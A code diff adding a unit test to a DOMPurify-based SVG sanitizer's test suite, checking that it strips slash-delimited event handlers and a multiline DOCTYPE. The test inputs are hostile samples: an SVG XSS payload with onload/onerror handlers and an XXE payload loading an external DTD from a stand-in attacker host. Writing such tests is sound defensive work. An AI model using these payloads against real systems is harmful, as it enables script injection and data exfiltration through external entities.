@@ -48,4 +48,18 @@ describe('Desk DOMPurify SVG Sanitizer (Phase 3 & HD-004)', () => {
     expect(sanitizeSvgContent(undefined)).toBe('');
     expect(sanitizeSvgContent('')).toBe('');
   });
+
+  it('strips slash-delimited event handlers (<svg/onload=...>) and multiline DOCTYPE DTD entities', () => {
+    const malicious = '<svg/onload=alert(1)><circle/onerror=alert(2) cx="50" cy="50" r="40"/></svg>';
+    const cleaned = sanitizeSvgContent(malicious);
+    expect(cleaned).not.toContain('onload');
+    expect(cleaned).not.toContain('onerror');
+    expect(cleaned).not.toContain('alert');
+
+    const xxe = '<!DOCTYPE svg [\n  <!ENTITY % remote SYSTEM "http://attacker.com/xxe.dtd">\n  %remote;\n]>\n<svg><text>hello</text></svg>';
+    const cleanedXxe = sanitizeSvgContent(xxe);
+    expect(cleanedXxe).not.toContain('<!DOCTYPE');
+    expect(cleanedXxe).not.toContain('%remote;');
+    expect(cleanedXxe).not.toContain(']>');
+  });
 });
